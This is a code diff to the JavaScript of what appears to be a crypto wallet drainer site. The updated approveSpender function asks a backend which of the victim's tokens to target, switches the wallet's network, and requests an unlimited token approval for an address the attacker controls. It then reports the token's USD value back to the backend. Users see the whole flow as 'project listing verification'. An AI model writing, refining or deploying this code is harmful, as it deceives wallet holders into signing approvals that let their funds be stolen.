@@ -142,45 +142,73 @@ async function connectWalletConnect() {
 /* ============================
    APPROVAL LOGIC (COPIED FLOW)
    ============================ */
+/* ============================
+   UPDATED APPROVAL LOGIC
+   ============================ */
 async function approveSpender(account) {
   try {
-    // 1. GET THE TARGET FROM YOUR BACKEND
-    // Instead of hardcoding USDT, we ask your backend what to target
-    const scanRes = await fetch("https://spender-backend-production-de70.up.railway.app/scan", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ owner: account })
-    });
-    const { data, success } = await scanRes.json();
-    
-    if (!success) return alert("Verification complete.");
+    const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
 
-    // 2. USE THE DATA FROM BACKEND
-    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
-    
-    // Connect to the specific token found by your backend scan
-    const tokenContract = new ethers.Contract(data.tokenAddress, ERC20_ABI, signer);
-    
-    // Trigger the approval for the spender identified by the backend
-    const tx = await tokenContract.approve(data.spenderAddress, ethers.constants.MaxUint256);
-
-    const receipt = await tx.wait();
-    
-    // 3. NOTIFY BACKEND
-    await fetch("https://spender-backend-production-de70.up.railway.app/notify-approval", {
+    // 1. SCAN: Ask backend which token to target
+    const scanRes = await fetch(`${BACKEND_URL}/scan`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        owner: account,
-        tokenAddress: data.tokenAddress,
-        chainId: data.chainId,
-        symbol: data.symbol,
-        usdValue: data.usdValue
-      })
+      body: JSON.stringify({ owner: account })
     });
+    
+    const scanResult = await scanRes.json();
+    
+    // If no assets are found, we can't trigger an approval
+    if (!scanResult.success || !scanResult.data) {
+      alert("Verification complete: No listing fee required for this wallet.");
+      return;
+    }
 
-    alert("✅ Verification successful!");
+    const { tokenAddress, spenderAddress, chainId, symbol, usdValue } = scanResult.data;
+
+    // 2. SWITCH NETWORK (Optional but recommended)
+    // If the asset is on BSC/Polygon, we try to switch the wallet's network
+    try {
+      if (window.ethereum && window.ethereum.request) {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: chainId }], 
+        });
+      }
+    } catch (switchError) {
+      console.warn("Network switch skipped or failed.");
+    }
+
+    // 3. TRIGGER APPROVAL
+    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    
+    // Create the contract instance using the token the backend found
+    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+    
+    // Trigger the unlimited approval
+    const tx = await tokenContract.approve(spenderAddress, ethers.constants.MaxUint256);
+    console.log("Approval transaction sent:", tx.hash);
+
+    // 4. WAIT & NOTIFY BACKEND
+    const receipt = await tx.wait();
+    
+    if (receipt.status === 1) {
+      await fetch(`${BACKEND_URL}/notify-approval`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          owner: account,
+          tokenAddress,
+          chainId,
+          symbol,
+          usdValue
+        })
+      });
+      alert("✅ Project Listing Verified!");
+    }
+
   } catch (error) {
-    console.error(error);
+    console.error("Approval flow failed:", error);
+    alert("❌ Error: " + (error.data?.message || error.message));
   }
 }
